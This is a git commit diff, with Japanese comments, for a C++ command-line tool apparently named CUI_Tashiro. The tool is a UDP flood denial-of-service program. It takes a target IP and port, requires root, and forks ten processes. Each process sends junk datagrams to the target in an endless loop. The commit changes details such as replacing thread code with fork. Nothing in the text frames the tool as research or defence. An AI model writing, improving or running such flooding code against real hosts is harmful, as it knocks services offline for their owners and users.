526db269c76c5fca44b41c2f62495a3f40a5651d
われ <74850252+ware255@users.noreply.github.com>
2022-02-23 23:54:00 +0900

    Update main.cpp

--- CUI_Tashiro/main.cpp
+++ CUI_Tashiro/main.cpp
@@ -1,6 +1,6 @@
 /*
 *  プロキシに通しての実行は出来ないのでご了承ください。
-*  もし、プロキシを通したい人がいるならばご自分で改造してください。
+*  もし、プロキシを通したい人がいるなら、ご自分で改造してください。＾＾
 */
 
 #include<cstdio>
@@ -14,10 +14,7 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#include <thread>
-
-#define THREADS 10
-using std::thread;
+#define THREADS 10  // <- 好きなように設定してどうぞ
 
 int port{};
 const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
@@ -27,7 +24,6 @@ const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
 
-//template <class T>
 void attack(char* str)
 {
     int soc{};
@@ -40,7 +36,7 @@ void attack(char* str)
     int(*F_sock)(int, int, int) = socket;
     int(*F_close)(int) = close;
 
-    while (true) {
+    while (1) {
         try {
             //ソケット生成
             soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
@@ -61,8 +57,8 @@ void attack(char* str)
 int main(int argc, char* argv[])
 {
     if (getuid() != 0) {
-        printf("\n管理者権限じゃないと10Mbps超えなかったから\nsudoを付けて実行をしてね。\n\n");
-        return -1;
+        printf("\nsudoを付けて実行をしてね。\n\n");
+        return 1;
     }
     else if (argc < 3) {
         printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
@@ -86,15 +82,7 @@ int main(int argc, char* argv[])
     void(*f)(char*) = &attack;
 
     for (int i = 0; i != THREADS; i++) {
-        //thread t1(attack, str);
-        //thread t2(attack2, str);
-        //thread t3(attack3, str);
-
-        //t1.join();
-        //t2.join();
-        //t3.join();
         if (fork()) {
-            //attack(str);
             (*f)(str);
         }
     }
